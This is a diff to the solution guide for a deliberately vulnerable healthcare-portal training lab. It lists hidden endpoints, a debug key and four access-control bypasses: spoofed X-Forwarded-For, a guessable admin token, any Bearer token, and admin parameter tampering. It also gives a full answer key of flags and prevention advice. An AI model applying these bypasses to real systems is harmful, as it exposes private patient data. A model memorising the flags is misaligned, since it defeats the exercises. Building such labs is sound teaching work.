@@ -466,54 +466,123 @@ print(r.json())
 ## Lab 5: Sensitive Data Exposure - Healthcare Portal
 
 **URL:** `/labs/beginner/sensitive-data`
-**API Endpoints:**
-- `GET /api/labs/sensitive/appointments` - List appointments (basic info)
-- `GET /api/labs/sensitive/patient/:id` - Get patient basic info
-- `GET /api/labs/sensitive/export?format=full` - **HIDDEN** - Export all sensitive data
-- `GET /api/labs/sensitive/backup` - **HIDDEN** - Backup configuration with AWS credentials
-- `GET /api/labs/sensitive/debug?key=healthcare_debug_2024` - **HIDDEN** - Debug endpoint
+**Vulnerable Pages:**
+- `GET /vuln/healthcare/portal` - Easy mode vulnerable portal
+- `GET /vuln/healthcare-secure/portal` - Hard mode with protections
 
-**Scenario:** Healthcare portal with hidden endpoints exposing sensitive patient data
+**Scenario:** Healthcare portal with real vulnerable endpoints exposing sensitive patient data (SSN, credit cards, medical records)
 
-### Exploitation Steps
+---
 
-1. Navigate to the healthcare portal - you only see appointments
-2. The visible API only shows basic patient info
-3. Use Burp Suite to discover hidden endpoints:
-   - Try common API paths: `/export`, `/backup`, `/debug`, `/admin`
-   - Check for parameter fuzzing: `?format=full`, `?format=csv`
+### Easy Mode - Hidden Endpoint Discovery
 
-### Hidden Endpoint Discovery
+Select "Easy Mode" tab. The vulnerable portal has hidden endpoints discoverable through:
+- HTML comments in page source
+- Common API path enumeration
 
-**Export Endpoint:**
+**Step 1: View Page Source**
+Right-click the page and view source. Look for HTML comments revealing endpoints.
+
+**Hidden Endpoints Found in Source:**
+```html
+<!-- /api/healthcare/admin/patients - Full patient data -->
+<!-- /api/healthcare/admin/export - Export records -->
+<!-- /api/healthcare/backup - AWS credentials -->
+<!-- Debug: healthcare_debug_2024 -->
 ```
-GET /api/labs/sensitive/export?format=full
-```
-Returns: All patient data including SSN, medical history, insurance
 
-**Backup Endpoint:**
+**Step 2: Access Hidden Endpoints**
 ```
-GET /api/labs/sensitive/backup
+GET /api/healthcare/admin/patients
+GET /api/healthcare/admin/export
+GET /api/healthcare/backup
+GET /api/healthcare/debug?key=healthcare_debug_2024
+GET /api/healthcare/.internal-docs
+GET /api/v1/patients/all  (deprecated but active)
 ```
-Returns: AWS credentials and backup configuration
 
-**Debug Endpoint:**
-```
-GET /api/labs/sensitive/debug?key=healthcare_debug_2024
-```
-Returns: Database credentials and API keys
+**Easy Mode Flags:**
+| Endpoint | Flag |
+|----------|------|
+| Admin patients | `FLAG{ADMIN_ENDPOINT_NO_AUTH}` |
+| Admin export | `FLAG{ADMIN_EXPORT_EXPOSED}` |
+| Internal docs | `FLAG{INTERNAL_API_DOCS_DISCOVERED}` |
+| Deprecated API | `FLAG{DEPRECATED_ENDPOINT_STILL_ACTIVE}` |
+| Debug endpoint | `FLAG{DEBUG_ENDPOINT_DISCOVERED}` |
+| Backup endpoint | `FLAG{BACKUP_CREDENTIALS_EXPOSED}` |
 
-### Flags
-- `FLAG{SENSITIVE_DATA_EXPORT_EXPOSED}` - Single patient export
-- `FLAG{BULK_SENSITIVE_DATA_LEAK}` - All patients bulk export
-- `FLAG{BACKUP_CREDENTIALS_EXPOSED}` - AWS backup credentials
-- `FLAG{DEBUG_ENDPOINT_DISCOVERED}` - Debug endpoint with secrets
+---
+
+### Hard Mode - Bypass Protection
+
+Select "Hard (Bypass Protection)" tab. This mode has security controls that can be bypassed.
+
+**Security Measures:**
+- Rate limiting: 5 requests per minute
+- Admin endpoint requires `X-Admin-Token` header
+- Export requires valid session/authorization
+
+**Bypass 1: X-Forwarded-For Header Bypass**
+Pretend to be an internal request:
+```
+GET /api/healthcare-secure/admin/patients
+X-Forwarded-For: 127.0.0.1
+```
+**Flag:** `FLAG{ADMIN_BYPASS_X_FORWARDED_FOR}`
+
+**Bypass 2: Predictable Admin Token**
+Token format revealed in HTML comment: `healthcare-admin-{year}`
+```
+GET /api/healthcare-secure/admin/patients
+X-Admin-Token: healthcare-admin-2024
+```
+**Flag:** `FLAG{ADMIN_TOKEN_GUESSED}`
+
+**Bypass 3: Any Bearer Token Accepted**
+Export endpoint accepts any Bearer token:
+```
+GET /api/healthcare-secure/export
+Authorization: Bearer anything
+```
+**Flag:** `FLAG{EXPORT_BYPASS_BEARER_ANY}`
+
+**Bypass 4: Admin Parameter Tampering**
+```
+GET /api/healthcare-secure/export?admin=true
+GET /api/healthcare-secure/export?role=admin
+```
+**Flag:** `FLAG{EXPORT_BYPASS_ADMIN_PARAM}`
+
+---
+
+### All Flags Summary
+
+**Easy Mode (6 flags):**
+| Flag | Description |
+|------|-------------|
+| `FLAG{ADMIN_ENDPOINT_NO_AUTH}` | Admin endpoint without auth |
+| `FLAG{ADMIN_EXPORT_EXPOSED}` | Export endpoint exposed |
+| `FLAG{INTERNAL_API_DOCS_DISCOVERED}` | Found internal API docs |
+| `FLAG{DEPRECATED_ENDPOINT_STILL_ACTIVE}` | Old API still works |
+| `FLAG{DEBUG_ENDPOINT_DISCOVERED}` | Debug with credentials |
+| `FLAG{BACKUP_CREDENTIALS_EXPOSED}` | AWS credentials exposed |
+
+**Hard Mode (4 flags):**
+| Flag | Description |
+|------|-------------|
+| `FLAG{ADMIN_BYPASS_X_FORWARDED_FOR}` | Header bypass |
+| `FLAG{ADMIN_TOKEN_GUESSED}` | Predictable token |
+| `FLAG{EXPORT_BYPASS_BEARER_ANY}` | Any Bearer accepted |
+| `FLAG{EXPORT_BYPASS_ADMIN_PARAM}` | Parameter tampering |
+
+**Total: 10 flags for Sensitive Data Exposure lab**
 
 ### Prevention
-- Remove or protect debug/export endpoints
+- Remove debug/export endpoints in production
 - Implement proper authentication for all endpoints
-- Use API gateway with route protection
-- Regular security audits for hidden endpoints
+- Don't trust X-Forwarded-For headers
+- Use strong, unpredictable tokens
+- Validate authorization properly (not just presence of header)
 
 ---
 
